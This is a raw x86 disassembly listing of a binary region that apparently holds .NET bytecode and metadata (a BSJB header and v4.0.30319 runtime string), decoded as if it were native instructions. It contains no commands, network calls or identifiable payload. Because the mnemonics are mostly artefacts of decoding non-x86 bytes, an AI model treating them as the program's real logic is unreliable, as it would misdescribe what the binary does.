  405d34:	0a 0a                	or     (%edx),%cl
  405d36:	73 18                	jae    0x405d50
  405d38:	01 00                	add    %eax,(%eax)
  405d3a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405d3d:	08 7e 09             	or     %bh,0x9(%esi)
  405d40:	00 00                	add    %al,(%eax)
  405d42:	04 28                	add    $0x28,%al
  405d44:	6c                   	insb   (%dx),%es:(%edi)
  405d45:	00 00                	add    %al,(%eax)
  405d47:	06                   	push   %es
  405d48:	6f                   	outsl  %ds:(%esi),(%dx)
  405d49:	19 01                	sbb    %eax,(%ecx)
  405d4b:	00 0a                	add    %cl,(%edx)
  405d4d:	6f                   	outsl  %ds:(%esi),(%dx)
  405d4e:	1b 01                	sbb    (%ecx),%eax
  405d50:	00 0a                	add    %cl,(%edx)
  405d52:	06                   	push   %es
  405d53:	18 6f 1c             	sbb    %ch,0x1c(%edi)
  405d56:	01 00                	add    %eax,(%eax)
  405d58:	0a 06                	or     (%esi),%al
  405d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  405d5b:	3a 01                	cmp    (%ecx),%al
  405d5d:	00 0a                	add    %cl,(%edx)
  405d5f:	13 04 02             	adc    (%edx,%eax,1),%eax
  405d62:	0d 11 04 09 16       	or     $0x16090411,%eax
  405d67:	09 8e b7 6f 1e 01    	or     %ecx,0x11e6fb7(%esi)
  405d6d:	00 0a                	add    %cl,(%edx)
  405d6f:	0b de                	or     %esi,%ebx
  405d71:	11 de                	adc    %ebx,%esi
  405d73:	0f 25                	(bad)
  405d75:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  405d7b:	05 28 27 00 00       	add    $0x2728,%eax
  405d80:	0a de                	or     %dh,%bl
  405d82:	00 07                	add    %al,(%edi)
  405d84:	2a 00                	sub    (%eax),%al
  405d86:	00 00                	add    %al,(%eax)
  405d88:	01 10                	add    %edx,(%eax)
  405d8a:	00 00                	add    %al,(%eax)
  405d8c:	00 00                	add    %al,(%eax)
  405d8e:	0c 00                	or     $0x0,%al
  405d90:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  405d94:	29 00                	sub    %eax,(%eax)
  405d96:	00 01                	add    %al,(%ecx)
  405d98:	1b 30                	sbb    (%eax),%esi
  405d9a:	04 00                	add    $0x0,%al
  405d9c:	55                   	push   %ebp
  405d9d:	00 00                	add    %al,(%eax)
  405d9f:	00 46 00             	add    %al,0x0(%esi)
  405da2:	00 11                	add    %dl,(%ecx)
  405da4:	73 17                	jae    0x405dbd
  405da6:	01 00                	add    %eax,(%eax)
  405da8:	0a 0a                	or     (%edx),%cl
  405daa:	73 18                	jae    0x405dc4
  405dac:	01 00                	add    %eax,(%eax)
  405dae:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405db1:	08 7e 09             	or     %bh,0x9(%esi)
  405db4:	00 00                	add    %al,(%eax)
  405db6:	04 28                	add    $0x28,%al
  405db8:	6c                   	insb   (%dx),%es:(%edi)
  405db9:	00 00                	add    %al,(%eax)
  405dbb:	06                   	push   %es
  405dbc:	6f                   	outsl  %ds:(%esi),(%dx)
  405dbd:	19 01                	sbb    %eax,(%ecx)
  405dbf:	00 0a                	add    %cl,(%edx)
  405dc1:	6f                   	outsl  %ds:(%esi),(%dx)
  405dc2:	1b 01                	sbb    (%ecx),%eax
  405dc4:	00 0a                	add    %cl,(%edx)
  405dc6:	06                   	push   %es
  405dc7:	18 6f 1c             	sbb    %ch,0x1c(%edi)
  405dca:	01 00                	add    %eax,(%eax)
  405dcc:	0a 06                	or     (%esi),%al
  405dce:	6f                   	outsl  %ds:(%esi),(%dx)
  405dcf:	1d 01 00 0a 13       	sbb    $0x130a0001,%eax
  405dd4:	04 02                	add    $0x2,%al
  405dd6:	0d 11 04 09 16       	or     $0x16090411,%eax
  405ddb:	09 8e b7 6f 1e 01    	or     %ecx,0x11e6fb7(%esi)
  405de1:	00 0a                	add    %cl,(%edx)
  405de3:	0b de                	or     %esi,%ebx
  405de5:	11 de                	adc    %ebx,%esi
  405de7:	0f 25                	(bad)
  405de9:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  405def:	05 28 27 00 00       	add    $0x2728,%eax
  405df4:	0a de                	or     %dh,%bl
  405df6:	00 07                	add    %al,(%edi)
  405df8:	2a 00                	sub    (%eax),%al
  405dfa:	00 00                	add    %al,(%eax)
  405dfc:	01 10                	add    %edx,(%eax)
  405dfe:	00 00                	add    %al,(%eax)
  405e00:	00 00                	add    %al,(%eax)
  405e02:	0c 00                	or     $0x0,%al
  405e04:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  405e08:	29 00                	sub    %eax,(%eax)
  405e0a:	00 01                	add    %al,(%ecx)
  405e0c:	13 30                	adc    (%eax),%esi
  405e0e:	03 00                	add    (%eax),%eax
  405e10:	18 00                	sbb    %al,(%eax)
  405e12:	00 00                	add    %al,(%eax)
  405e14:	47                   	inc    %edi
  405e15:	00 00                	add    %al,(%eax)
  405e17:	11 16                	adc    %edx,(%esi)
  405e19:	7e 10                	jle    0x405e2b
  405e1b:	00 00                	add    %al,(%eax)
  405e1d:	04 12                	add    $0x12,%al
  405e1f:	00 73 3b             	add    %dh,0x3b(%ebx)
  405e22:	01 00                	add    %eax,(%eax)
  405e24:	0a 80 33 00 00 04    	or     0x4000033(%eax),%al
  405e2a:	06                   	push   %es
  405e2b:	0b 2b                	or     (%ebx),%ebp
  405e2d:	00 07                	add    %al,(%edi)
  405e2f:	2a 62 7e             	sub    0x7e(%edx),%ah
  405e32:	33 00                	xor    (%eax),%eax
  405e34:	00 04 2c             	add    %al,(%esp,%ebp,1)
  405e37:	10 7e 33             	adc    %bh,0x33(%esi)
  405e3a:	00 00                	add    %al,(%eax)
  405e3c:	04 6f                	add    $0x6f,%al
  405e3e:	3c 01                	cmp    $0x1,%al
  405e40:	00 0a                	add    %cl,(%edx)
  405e42:	14 80                	adc    $0x80,%al
  405e44:	33 00                	xor    (%eax),%eax
  405e46:	00 04 2a             	add    %al,(%edx,%ebp,1)
  405e49:	00 00                	add    %al,(%eax)
  405e4b:	00 42 53             	add    %al,0x53(%edx)
  405e4e:	4a                   	dec    %edx
  405e4f:	42                   	inc    %edx
  405e50:	01 00                	add    %eax,(%eax)
  405e52:	01 00                	add    %eax,(%eax)
  405e54:	00 00                	add    %al,(%eax)
  405e56:	00 00                	add    %al,(%eax)
  405e58:	0c 00                	or     $0x0,%al
  405e5a:	00 00                	add    %al,(%eax)
  405e5c:	76 34                	jbe    0x405e92
  405e5e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405e61:	33 30                	xor    (%eax),%esi
  405e63:	33 31                	xor    (%ecx),%esi
  405e65:	39 00                	cmp    %eax,(%eax)
  405e67:	00 00                	add    %al,(%eax)
  405e69:	00 05 00 6c 00 00    	add    %al,0x6c00
  405e6f:	00 b4 1c 00 00 23 7e 	add    %dh,0x7e230000(%esp,%ebx,1)
  405e76:	00 00                	add    %al,(%eax)
  405e78:	20 1d 00 00 5c 20    	and    %bl,0x205c0000
  405e7e:	00 00                	add    %al,(%eax)
  405e80:	23 53 74             	and    0x74(%ebx),%edx
  405e83:	72 69                	jb     0x405eee
  405e85:	6e                   	outsb  %ds:(%esi),(%dx)
  405e86:	67 73 00             	addr16 jae 0x405e89
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 7c 3d 00          	add    %bh,0x0(%ebp,%edi,1)
  405e8f:	00 e8                	add    %ch,%al
  405e91:	12 00                	adc    (%eax),%al
  405e93:	00 23                	add    %ah,(%ebx)
  405e95:	55                   	push   %ebp
  405e96:	53                   	push   %ebx
  405e97:	00 64 50 00          	add    %ah,0x0(%eax,%edx,2)
  405e9b:	00 10                	add    %dl,(%eax)
  405e9d:	00 00                	add    %al,(%eax)
  405e9f:	00 23                	add    %ah,(%ebx)
  405ea1:	47                   	inc    %edi
  405ea2:	55                   	push   %ebp
  405ea3:	49                   	dec    %ecx
  405ea4:	44                   	inc    %esp
  405ea5:	00 00                	add    %al,(%eax)
  405ea7:	00 74 50 00          	add    %dh,0x0(%eax,%edx,2)
  405eab:	00 18                	add    %bl,(%eax)
  405ead:	0b 00                	or     (%eax),%eax
  405eaf:	00 23                	add    %ah,(%ebx)
  405eb1:	42                   	inc    %edx
  405eb2:	6c                   	insb   (%dx),%es:(%edi)
  405eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  405eb4:	62 00                	bound  %eax,(%eax)
  405eb6:	00 00                	add    %al,(%eax)
  405eb8:	00 00                	add    %al,(%eax)
  405eba:	00 00                	add    %al,(%eax)
  405ebc:	02 00                	add    (%eax),%al
  405ebe:	00 01                	add    %al,(%ecx)
  405ec0:	57                   	push   %edi
  405ec1:	3d a2 1d 09 0e       	cmp    $0xe091da2,%eax
  405ec6:	00 00                	add    %al,(%eax)
  405ec8:	00 fa                	add    %bh,%dl
  405eca:	25 33 00 16 00       	and    $0x160033,%eax
  405ecf:	00 01                	add    %al,(%ecx)
  405ed1:	00 00                	add    %al,(%eax)
  405ed3:	00 b0 00 00 00 14    	add    %dh,0x14000000(%eax)
  405ed9:	00 00                	add    %al,(%eax)
  405edb:	00 3b                	add    %bh,(%ebx)
  405edd:	00 00                	add    %al,(%eax)
  405edf:	00 81 00 00 00 70    	add    %al,0x70000000(%ecx)
  405ee5:	00 00                	add    %al,(%eax)
  405ee7:	00 47 01             	add    %al,0x1(%edi)
  405eea:	00 00                	add    %al,(%eax)
  405eec:	05 00 00 00 42       	add    $0x42000000,%eax
  405ef1:	00 00                	add    %al,(%eax)
  405ef3:	00 08                	add    %cl,(%eax)
  405ef5:	00 00                	add    %al,(%eax)
  405ef7:	00 47 00             	add    %al,0x0(%edi)
  405efa:	00 00                	add    %al,(%eax)
  405efc:	02 00                	add    (%eax),%al
  405efe:	00 00                	add    %al,(%eax)
  405f00:	05 00 00 00 05       	add    $0x5000000,%eax
  405f05:	00 00                	add    %al,(%eax)
  405f07:	00 05 00 00 00 0b    	add    %al,0xb000000
  405f0d:	00 00                	add    %al,(%eax)
  405f0f:	00 15 00 00 00 01    	add    %dl,0x1000000
  405f15:	00 00                	add    %al,(%eax)
  405f17:	00 07                	add    %al,(%edi)
  405f19:	00 00                	add    %al,(%eax)
  405f1b:	00 06                	add    %al,(%esi)
  405f1d:	00 00                	add    %al,(%eax)
  405f1f:	00 03                	add    %al,(%ebx)
  405f21:	00 00                	add    %al,(%eax)
  405f23:	00 04 00             	add    %al,(%eax,%eax,1)
  405f26:	00 00                	add    %al,(%eax)
  405f28:	00 00                	add    %al,(%eax)
  405f2a:	51                   	push   %ecx
  405f2b:	20 01                	and    %al,(%ecx)
  405f2d:	00 00                	add    %al,(%eax)
  405f2f:	00 00                	add    %al,(%eax)
  405f31:	00 0a                	add    %cl,(%edx)
  405f33:	00 36                	add    %dh,(%esi)
  405f35:	01 0c 01             	add    %ecx,(%ecx,%eax,1)
  405f38:	0a 00                	or     (%eax),%al
  405f3a:	6a 01                	push   $0x1
  405f3c:	4c                   	dec    %esp
  405f3d:	01 06                	add    %eax,(%esi)
  405f3f:	00 7a 01             	add    %bh,0x1(%edx)
  405f42:	73 01                	jae    0x405f45
  405f44:	0a 00                	or     (%eax),%al
  405f46:	d2 01                	rolb   %cl,(%ecx)
  405f48:	0c 01                	or     $0x1,%al
  405f4a:	06                   	push   %es
  405f4b:	00 50 02             	add    %dl,0x2(%eax)
  405f4e:	73 01                	jae    0x405f51
  405f50:	0e                   	push   %cs
  405f51:	00 e3                	add    %ah,%bl
  405f53:	03 d0                	add    %eax,%edx
  405f55:	03 06                	add    (%esi),%eax
  405f57:	00 0a                	add    %cl,(%edx)
  405f59:	04 00                	add    $0x0,%al
  405f5b:	04 06                	add    $0x6,%al
  405f5d:	00 2b                	add    %ch,(%ebx)
  405f5f:	04 1a                	add    $0x1a,%al
  405f61:	04 06                	add    $0x6,%al
  405f63:	00 36                	add    %dh,(%esi)
  405f65:	04 1a                	add    $0x1a,%al
  405f67:	04 06                	add    $0x6,%al
  405f69:	00 be 04 73 01 06    	add    %bh,0x6017304(%esi)
  405f6f:	00 3d 05 1a 04 06    	add    %bh,0x6041a05
  405f75:	00 d7                	add    %dl,%bh
  405f77:	07                   	pop    %es
  405f78:	cb                   	lret
  405f79:	07                   	pop    %es
  405f7a:	0e                   	push   %cs
  405f7b:	00 9e 08 8e 08 06    	add    %bl,0x6088e08(%esi)
  405f81:	00 5b 09             	add    %bl,0x9(%ebx)
  405f84:	00 04 06             	add    %al,(%esi,%eax,1)
  405f87:	00 7a 09             	add    %bh,0x9(%edx)
  405f8a:	73 01                	jae    0x405f8d
  405f8c:	06                   	push   %es
  405f8d:	00 e0                	add    %ah,%al
  405f8f:	09 73 01             	or     %esi,0x1(%ebx)
  405f92:	06                   	push   %es
  405f93:	00 08                	add    %cl,(%eax)
  405f95:	03 1a                	add    (%edx),%ebx
  405f97:	04 06                	add    $0x6,%al
  405f99:	00 ed                	add    %ch,%ch
  405f9b:	0a 73 01             	or     0x1(%ebx),%dh
  405f9e:	06                   	push   %es
  405f9f:	00 19                	add    %bl,(%ecx)
  405fa1:	0b 73 01             	or     0x1(%ebx),%esi
  405fa4:	06                   	push   %es
  405fa5:	00 7c 0b 73          	add    %bh,0x73(%ebx,%ecx,1)
  405fa9:	01 06                	add    %eax,(%esi)
  405fab:	00 94 0b 73 01 0e 00 	add    %dl,0xe0173(%ebx,%ecx,1)
  405fb2:	ec                   	in     (%dx),%al
  405fb3:	0b d6                	or     %esi,%edx
  405fb5:	0b 0e                	or     (%esi),%ecx
  405fb7:	00 05 0c d6 0b 0e    	add    %al,0xe0bd60c
  405fbd:	00 32                	add    %dh,(%edx)
  405fbf:	0c 1a                	or     $0x1a,%al
  405fc1:	0c 06                	or     $0x6,%al
  405fc3:	00 5c 0c 49          	add    %bl,0x49(%esp,%ecx,1)
  405fc7:	0c 0a                	or     $0xa,%al
  405fc9:	00 9b 0c 74 0c 0a    	add    %bl,0xa0c740c(%ebx)
  405fcf:	00 b3 0c 13 00 0e    	add    %dh,0xe00130c(%ebx)
  405fd5:	00 e8                	add    %ch,%al
  405fd7:	0c cb                	or     $0xcb,%al
  405fd9:	0c 06                	or     $0x6,%al
  405fdb:	00 1d 0d fd 0c 06    	add    %bl,0x60cfd0d
  405fe1:	00 3b                	add    %bh,(%ebx)
  405fe3:	0d 73 01 06 00       	or     $0x60173,%eax
  405fe8:	5f                   	pop    %edi
  405fe9:	0d 73 01 0a 00       	or     $0xa0173,%eax
  405fee:	78 0d                	js     0x405ffd
  405ff0:	13 00                	adc    (%eax),%eax
  405ff2:	06                   	push   %es
  405ff3:	00 b2 0d 93 0d 06    	add    %dh,0x60d930d(%edx)
  405ff9:	00 c6                	add    %al,%dh
  405ffb:	0d 73 01 06 00       	or     $0x60173,%eax
  406000:	dc 0d fd 0c 0a 00    	fmull  0xa0cfd
  406006:	f7 0d 74 0c 0a 00 0d 	testl  $0x130e0d,0xa0c74
  40600d:	0e 13 00 
  406010:	06                   	push   %es
  406011:	00 21                	add    %ah,(%ecx)
  406013:	0e                   	push   %cs
  406014:	73 01                	jae    0x406017
  406016:	06                   	push   %es
  406017:	00 6a 0e             	add    %ch,0xe(%edx)
  40601a:	49                   	dec    %ecx
  40601b:	0c 06                	or     $0x6,%al
  40601d:	00 83 0e 49 0c 06    	add    %al,0x60c490e(%ebx)
  406023:	00 a0 0e 73 01 06    	add    %ah,0x601730e(%eax)
  406029:	00 aa 0e 00 04 0e    	add    %ch,0xe04000e(%edx)
  40602f:	00 b3 0e 49 0c 0e    	add    %dh,0xe0c490e(%ebx)
  406035:	00 bb 0e 49 0c 06    	add    %bh,0x60c490e(%ebx)
  40603b:	00 cc                	add    %cl,%ah
  40603d:	0e                   	push   %cs
  40603e:	73 01                	jae    0x406041
  406040:	0a 00                	or     (%eax),%al
  406042:	f3 0e                	repz push %cs
  406044:	74 0c                	je     0x406052
  406046:	06                   	push   %es
  406047:	00 26                	add    %ah,(%esi)
  406049:	0f 00 04 06          	sldt   (%esi,%eax,1)
  40604d:	00 4f 0f             	add    %cl,0xf(%edi)
  406050:	00 04 06             	add    %al,(%esi,%eax,1)
  406053:	00 70 0f             	add    %dh,0xf(%eax)
  406056:	00 04 0e             	add    %al,(%esi,%ecx,1)
  406059:	00 97 0f 49 0c 06    	add    %dl,0x60c490f(%edi)
  40605f:	00 c4                	add    %al,%ah
  406061:	0f 00 04 0a          	sldt   (%edx,%ecx,1)
  406065:	00 05 10 4c 01 0a    	add    %al,0xa014c10
  40606b:	00 35 10 14 10 06    	add    %dh,0x6101410
  406071:	00 50 10             	add    %dl,0x10(%eax)
  406074:	8e 08                	mov    (%eax),%cs
  406076:	b7 00                	mov    $0x0,%bh
  406078:	77 10                	ja     0x40608a
  40607a:	00 00                	add    %al,(%eax)
  40607c:	06                   	push   %es
  40607d:	00 a0 10 73 01 0a    	add    %ah,0xa017310(%eax)
  406083:	00 a8 10 74 0c 06    	add    %ch,0x60c7410(%eax)
  406089:	00 e2                	add    %ah,%dl
  40608b:	10 00                	adc    %al,(%eax)
  40608d:	04 06                	add    $0x6,%al
  40608f:	00 eb                	add    %ch,%bl
  406091:	10 1a                	adc    %bl,(%edx)
  406093:	04 0e                	add    $0xe,%al
  406095:	00 1b                	add    %bl,(%ebx)
  406097:	11 49 0c             	adc    %ecx,0xc(%ecx)
  40609a:	0e                   	push   %cs
  40609b:	00 67 11             	add    %ah,0x11(%edi)
  40609e:	5c                   	pop    %esp
  40609f:	11 0a                	adc    %ecx,(%edx)
  4060a1:	00 89 11 4c 01 06    	add    %cl,0x6014c11(%ecx)
  4060a7:	00 c0                	add    %al,%al
  4060a9:	11 ad 11 12 00 de    	adc    %ebp,-0x21ffedef(%ebp)
  4060af:	11 cc                	adc    %ecx,%esp
  4060b1:	11 06                	adc    %eax,(%esi)
  4060b3:	00 f7                	add    %dh,%bh
  4060b5:	11 ad 11 0a 00 2a    	adc    %ebp,0x2a000a11(%ebp)
  4060bb:	12 74 0c 06          	adc    0x6(%esp,%ecx,1),%dh
  4060bf:	00 5c 12 73          	add    %bl,0x73(%edx,%edx,1)
  4060c3:	01 06                	add    %eax,(%esi)
  4060c5:	00 7b 12             	add    %bh,0x12(%ebx)
  4060c8:	73 01                	jae    0x4060cb
  4060ca:	06                   	push   %es
  4060cb:	00 8f 12 1a 04 06    	add    %cl,0x6041a12(%edi)
  4060d1:	00 a2 12 73 01 06    	add    %ah,0x6017312(%edx)
  4060d7:	00 b5 12 93 0d 0e    	add    %dh,0xe0d9312(%ebp)
  4060dd:	00 f0                	add    %dh,%al
  4060df:	12 5c 11 06          	adc    0x6(%ecx,%edx,1),%bl
  4060e3:	00 fa                	add    %bh,%dl
  4060e5:	12 73 01             	adc    0x1(%ebx),%dh
  4060e8:	0e                   	push   %cs
  4060e9:	00 05 13 5c 11 06    	add    %al,0x6115c13
  4060ef:	00 1a                	add    %bl,(%edx)
  4060f1:	13 1a                	adc    (%edx),%ebx
  4060f3:	04 0e                	add    $0xe,%al
  4060f5:	00 28                	add    %ch,(%eax)
  4060f7:	13 d0                	adc    %eax,%edx
  4060f9:	03 0e                	add    (%esi),%ecx
  4060fb:	00 36                	add    %dh,(%esi)
  4060fd:	13 d0                	adc    %eax,%edx
  4060ff:	03 0e                	add    (%esi),%ecx
  406101:	00 41 13             	add    %al,0x13(%ecx)
  406104:	d0 03                	rolb   $1,(%ebx)
  406106:	06                   	push   %es
  406107:	00 4e 13             	add    %cl,0x13(%esi)
  40610a:	73 01                	jae    0x40610d
  40610c:	0e                   	push   %cs
  40610d:	00 84 13 d0 03 06 00 	add    %al,0x603d0(%ebx,%edx,1)
  406114:	90                   	nop
  406115:	13 1a                	adc    (%edx),%ebx
  406117:	04 06                	add    $0x6,%al
  406119:	00 b9 13 73 01 06    	add    %bh,0x6017313(%ecx)
  40611f:	00 02                	add    %al,(%edx)
  406121:	14 73                	adc    $0x73,%al
  406123:	01 06                	add    %eax,(%esi)
  406125:	00 0b                	add    %cl,(%ebx)
  406127:	14 00                	adc    $0x0,%al
  406129:	04 06                	add    $0x6,%al
  40612b:	00 46 14             	add    %al,0x14(%esi)
  40612e:	2c 14                	sub    $0x14,%al
  406130:	06                   	push   %es
  406131:	00 61 14             	add    %ah,0x14(%ecx)
  406134:	2c 14                	sub    $0x14,%al
  406136:	06                   	push   %es
  406137:	00 72 14             	add    %dh,0x14(%edx)
  40613a:	2c 14                	sub    $0x14,%al
  40613c:	12 00                	adc    (%eax),%al
  40613e:	8e 14 cc             	mov    (%esp,%ecx,8),%ss
  406141:	11 12                	adc    %edx,(%edx)
  406143:	00 a3 14 cc 11 67    	add    %ah,0x6711cc14(%ebx)
  406149:	01 be 14 00 00 12    	add    %edi,0x12000014(%esi)
  40614f:	00 12                	add    %dl,(%edx)
  406151:	15 cc 11 12 00       	adc    $0x1211cc,%eax
  406156:	1e                   	push   %ds
  406157:	15 cc 11 06 00       	adc    $0x611cc,%eax
  40615c:	68 15 73 01 0a       	push   $0xa017315
  406161:	00 6f 15             	add    %ch,0x15(%edi)
  406164:	13 00                	adc    (%eax),%eax
  406166:	06                   	push   %es
  406167:	00 7e 15             	add    %bh,0x15(%esi)
  40616a:	73 01                	jae    0x40616d
  40616c:	06                   	push   %es
  40616d:	00 89 15 73 01 06    	add    %cl,0x6017315(%ecx)
  406173:	00 b1 15 00 04 06    	add    %dh,0x6040015(%ecx)
  406179:	00 c8                	add    %cl,%al
  40617b:	15 1a 04 0a 00       	adc    $0xa041a,%eax
  406180:	e1 15                	loope  0x406197
  406182:	74 0c                	je     0x406190
  406184:	06                   	push   %es
  406185:	00 0f                	add    %cl,(%edi)
  406187:	16                   	push   %ss
  406188:	1a 04 0e             	sbb    (%esi,%ecx,1),%al
  40618b:	00 1d 16 d0 03 06    	add    %bl,0x603d016
  406191:	00 3d 16 73 01 16    	add    %bh,0x16017316
  406197:	00 a6 16 97 16 16    	add    %ah,0x16169716(%esi)
  40619d:	00 af 16 97 16 16    	add    %ch,0x16169716(%edi)
  4061a3:	00 b4 16 97 16 16 00 	add    %dh,0x161697(%esi,%edx,1)
  4061aa:	be 16 97 16 0a       	mov    $0xa169716,%esi
  4061af:	00 c5                	add    %al,%ch
  4061b1:	16                   	push   %ss
  4061b2:	13 00                	adc    (%eax),%eax
  4061b4:	0a 00                	or     (%eax),%al
  4061b6:	cd 16                	int    $0x16
  4061b8:	13 00                	adc    (%eax),%eax
  4061ba:	1a 00                	sbb    (%eax),%al
  4061bc:	23 02                	and    (%edx),%eax
  4061be:	db 16                	fistl  (%esi)
  4061c0:	0e                   	push   %cs
  4061c1:	00 f8                	add    %bh,%al
  4061c3:	16                   	push   %ss
  4061c4:	d0 03                	rolb   $1,(%ebx)
  4061c6:	06                   	push   %es
  4061c7:	00 10                	add    %dl,(%eax)
  4061c9:	17                   	pop    %ss
  4061ca:	73 01                	jae    0x4061cd
  4061cc:	0e                   	push   %cs
  4061cd:	00 29                	add    %ch,(%ecx)
  4061cf:	17                   	pop    %ss
  4061d0:	5c                   	pop    %esp
  4061d1:	11 0e                	adc    %ecx,(%esi)
  4061d3:	00 53 17             	add    %dl,0x17(%ebx)
  4061d6:	5c                   	pop    %esp
  4061d7:	11 0a                	adc    %ecx,(%edx)
  4061d9:	00 b9 17 13 00 1a    	add    %bh,0x1a001317(%ecx)
  4061df:	00 03                	add    %al,(%ebx)
  4061e1:	18 db                	sbb    %bl,%bl
  4061e3:	16                   	push   %ss
  4061e4:	16                   	push   %ss
  4061e5:	00 53 18             	add    %dl,0x18(%ebx)
  4061e8:	3c 18                	cmp    $0x18,%al
  4061ea:	16                   	push   %ss
  4061eb:	00 5f 18             	add    %bl,0x18(%edi)
  4061ee:	97                   	xchg   %eax,%edi
  4061ef:	16                   	push   %ss
  4061f0:	16                   	push   %ss
  4061f1:	00 6f 18             	add    %ch,0x18(%edi)
  4061f4:	97                   	xchg   %eax,%edi
  4061f5:	16                   	push   %ss
  4061f6:	16                   	push   %ss
  4061f7:	00 91 18 97 16 16    	add    %dl,0x16169718(%ecx)
  4061fd:	00 a8 18 3c 18 06    	add    %ch,0x6183c18(%eax)
  406203:	00 e3                	add    %ah,%bl
  406205:	18 d1                	sbb    %dl,%cl
  406207:	18 06                	sbb    %al,(%esi)
  406209:	00 ee                	add    %ch,%dh
  40620b:	18 73 01             	sbb    %dh,0x1(%ebx)
  40620e:	06                   	push   %es
  40620f:	00 0a                	add    %cl,(%edx)
  406211:	19 d1                	sbb    %edx,%ecx
  406213:	18 06                	sbb    %al,(%esi)
  406215:	00 21                	add    %ah,(%ecx)
  406217:	19 d1                	sbb    %edx,%ecx
  406219:	18 06                	sbb    %al,(%esi)
  40621b:	00 5e 19             	add    %bl,0x19(%esi)
  40621e:	73 01                	jae    0x406221
  406220:	0e                   	push   %cs
  406221:	00 6f 19             	add    %ch,0x19(%edi)
  406224:	49                   	dec    %ecx
  406225:	0c 06                	or     $0x6,%al
  406227:	00 bb 19 a0 19 06    	add    %bh,0x619a019(%ebx)
  40622d:	00 f5                	add    %dh,%ch
  40622f:	19 73 01             	sbb    %esi,0x1(%ebx)
  406232:	1e                   	push   %ds
  406233:	00 14 1a             	add    %dl,(%edx,%ebx,1)
  406236:	08 1a                	or     %bl,(%edx)
  406238:	06                   	push   %es
  406239:	00 1f                	add    %bl,(%edi)
  40623b:	1a a0 19 0e 00 31    	sbb    0x31000e19(%eax),%ah
  406241:	1a 5c 11 0e          	sbb    0xe(%ecx,%edx,1),%bl
  406245:	00 40 1a             	add    %al,0x1a(%eax)
  406248:	5c                   	pop    %esp
  406249:	11 0e                	adc    %ecx,(%esi)
  40624b:	00 50 1a             	add    %dl,0x1a(%eax)
  40624e:	5c                   	pop    %esp
  40624f:	11 0e                	adc    %ecx,(%esi)
  406251:	00 9d 1a 5c 11 06    	add    %bl,0x6115c1a(%ebp)
  406257:	00 d3                	add    %dl,%bl
  406259:	1a d1                	sbb    %cl,%dl
  40625b:	18 06                	sbb    %al,(%esi)
  40625d:	00 de                	add    %bl,%dh
  40625f:	1a d1                	sbb    %cl,%dl
  406261:	18 06                	sbb    %al,(%esi)
  406263:	00 fa                	add    %bh,%dl
  406265:	1a cb                	sbb    %bl,%cl
  406267:	07                   	pop    %es
  406268:	06                   	push   %es
  406269:	00 22                	add    %ah,(%edx)
  40626b:	1b 93 0d 06 00 35    	sbb    0x3500060d(%ebx),%edx
  406271:	1b 93 0d 06 00 43    	sbb    0x4300060d(%ebx),%edx
  406277:	1b 00                	sbb    (%eax),%eax
  406279:	04 06                	add    $0x6,%al
  40627b:	00 50 1b             	add    %dl,0x1b(%eax)
  40627e:	8e 08                	mov    (%eax),%cs
  406280:	06                   	push   %es
  406281:	00 94 1b 00 04 06 00 	add    %dl,0x60400(%ebx,%ebx,1)
  406288:	21 1c 93             	and    %ebx,(%ebx,%edx,4)
  40628b:	0d 1a 00 3e 1c       	or     $0x1c3e001a,%eax
  406290:	db 16                	fistl  (%esi)
  406292:	06                   	push   %es
  406293:	00 4f 1c             	add    %cl,0x1c(%edi)
  406296:	73 01                	jae    0x406299
  406298:	06                   	push   %es
  406299:	00 83 1c 93 0d 0e    	add    %al,0xe0d931c(%ebx)
  40629f:	00 90 1c 8e 08 0e    	add    %dl,0xe088e1c(%eax)
  4062a5:	00 aa 1c 8e 08 06    	add    %ch,0x6088e1c(%edx)
  4062ab:	00 17                	add    %dl,(%edi)
  4062ad:	1d fa 1c 06 00       	sbb    $0x61cfa,%eax
  4062b2:	27                   	daa
  4062b3:	1d fa 1c 06 00       	sbb    $0x61cfa,%eax
  4062b8:	38 1d fa 1c 06 00    	cmp    %bl,0x61cfa
  4062be:	51                   	push   %ecx
  4062bf:	1d fa 1c 06 00       	sbb    $0x61cfa,%eax
  4062c4:	6b 1d 73 01 06 00 76 	imul   $0x76,0x60173,%ebx
  4062cb:	1d fa 1c 06 00       	sbb    $0x61cfa,%eax
  4062d0:	91                   	xchg   %eax,%ecx
  4062d1:	1d fa 1c 0e 00       	sbb    $0xe1cfa,%eax
  4062d6:	d6                   	salc
  4062d7:	1d 73 01 0e 00       	sbb    $0xe0173,%eax
  4062dc:	da 1d 73 01 06 00    	ficompl 0x60173
  4062e2:	54                   	push   %esp
  4062e3:	1e                   	push   %ds
  4062e4:	00 04 06             	add    %al,(%esi,%eax,1)
  4062e7:	00 6c 1e 73          	add    %ch,0x73(%esi,%ebx,1)
  4062eb:	01 06                	add    %eax,(%esi)
  4062ed:	00 84 1e 8e 08 06 00 	add    %al,0x6088e(%esi,%ebx,1)
  4062f4:	ac                   	lods   %ds:(%esi),%al
  4062f5:	1e                   	push   %ds
  4062f6:	8e 08                	mov    (%eax),%cs
  4062f8:	06                   	push   %es
  4062f9:	00 be 1e 73 01 0e    	add    %bh,0xe01731e(%esi)
  4062ff:	00 e1                	add    %ah,%cl
  406301:	1e                   	push   %ds
  406302:	cb                   	lret
  406303:	1e                   	push   %ds
  406304:	0e                   	push   %cs
  406305:	00 ec                	add    %ch,%ah
  406307:	1e                   	push   %ds
  406308:	cb                   	lret
  406309:	1e                   	push   %ds
  40630a:	06                   	push   %es
  40630b:	00 26                	add    %ah,(%esi)
  40630d:	1f                   	pop    %ds
  40630e:	93                   	xchg   %eax,%ebx
  40630f:	0d 06 00 3c 1f       	or     $0x1f3c0006,%eax
  406314:	93                   	xchg   %eax,%ebx
  406315:	0d 06 00 47 1f       	or     $0x1f470006,%eax
  40631a:	fd                   	std
  40631b:	0c 06                	or     $0x6,%al
  40631d:	00 67 1f             	add    %ah,0x1f(%edi)
  406320:	fd                   	std
  406321:	0c 06                	or     $0x6,%al
  406323:	00 85 1f 93 0d 06    	add    %al,0x60d931f(%ebp)
